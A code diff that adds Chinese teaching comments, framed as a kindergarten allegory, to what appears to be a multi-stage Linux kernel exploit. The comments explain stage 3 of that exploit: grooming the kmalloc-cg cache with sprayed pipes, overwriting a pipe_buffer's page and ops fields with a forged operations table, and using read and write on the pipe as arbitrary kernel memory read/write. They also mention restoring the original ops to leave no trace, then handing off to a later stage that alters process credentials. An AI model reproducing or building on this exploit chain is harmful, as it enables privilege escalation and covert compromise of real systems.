@@ -1,3 +1,22 @@
+/* ==========================================================================
+ * 【第 3 关】拿到万能钥匙 —— pipe buffer 改造成任意物理地址读写
+ * ==========================================================================
+ * 用偷换来的钥匙牌(第 2 关的假 fops)打开特殊柜子，拿到一根"魔法水管"
+ * (pipe 管道)。水管本来只能通水(读写自己缓冲区)，但水管的"阀门"
+ * (pipe_buffer.ops)是可以换的 —— 把阀门换成"指着任意物理页"的假阀门：
+ *
+ *   pipe_buffer.page = 想读/写的物理页(struct page*)
+ *   pipe_buffer.ops  = 假阀门表(书包里伪造的 pipe_buf_operations)
+ *
+ * 之后 read(pipe) = 园长帮我们读任意物理页；write(pipe) = 写任意物理页。
+ * 这就是"万能钥匙"：全幼儿园(全内核内存)任何柜子都能开。
+ *
+ * 关键步骤：
+ *   shape_pipe_cache    = 先把水管柜的格子(kmalloc-cg 缓存)腾整齐
+ *   prepare_pipe_buffer = 占一个水管格，把假阀门装上去
+ *   pipe_phys_read/write= 万能钥匙正式使用(任意内核地址读/写)
+ * ========================================================================== */
+
 #include "common.h"
 
 #define PIPE_SHAPE_ROUNDS 0
@@ -79,6 +98,8 @@ void free_pipe_object(int pipefd[2]) {
   resize_pipe_slots(pipefd, 2);
 }
 
+/* 【腾水管柜的格子】开一堆水管(pipe)把 kmalloc-cg 缓存格子占满再放掉，
+ * 让后面的水管对象能落在我们熟悉的格子里(提高假阀门命中概率)。 */
 void shape_pipe_cache_once(void) {
   for (size_t i = 0; i < PIPE_N_COUNT; i++) {
     alloc_pipe_object(pipe_fds_n[i]);
@@ -115,6 +136,9 @@ void shape_pipe_cache(void) {
   }
 }
 
+/* 【给水管装假阀门】在子进程里占住一个水管格(pipe_buffer)，
+ * 用假钥匙牌的写能力(kernel_write_data)把水管的 page/ops 字段改写：
+ * ops -> 书包里的假阀门表(page 指针可随时换 = 想开哪个柜子指哪个)。 */
 uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx prep;
   struct mm_ctx spray;
@@ -486,6 +510,8 @@ int find_pipe_buffer(int fd, uintptr_t base) {
   return 0;
 }
 
+/* 【万能钥匙: 读】把水管 page 指到目标物理页，read(pipe) 一倒，
+ * 园长就把那个柜子里的内容原样搬给我们。 */
 int pipe_phys_read(
     int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
     void *out, size_t len) {
@@ -514,6 +540,8 @@ int pipe_phys_read(
   return ok;
 }
 
+/* 【万能钥匙: 写】把水管 page 指到目标物理页，write(pipe) 一灌，
+ * 我们写的内容就出现在那个柜子里(用完把原阀门装回去，不留痕迹)。 */
 int pipe_phys_write(
     int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
     const void *data, size_t len) {
@@ -612,6 +640,8 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
   return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
 }
 
+/* 【第 3 关验收 + 交接】用水管在书包页上做读写标记测试(PHYS_READ/WRITE_TAG)，
+ * 读写都通过才算"万能钥匙到手"，随后立即交给第 4 关去改人事档案。 */
 int install_pipe_physrw(int fd) {
   if (pipebuf_page_base == 0) {
     atomic_store(&pipe_prepare_done, 0);
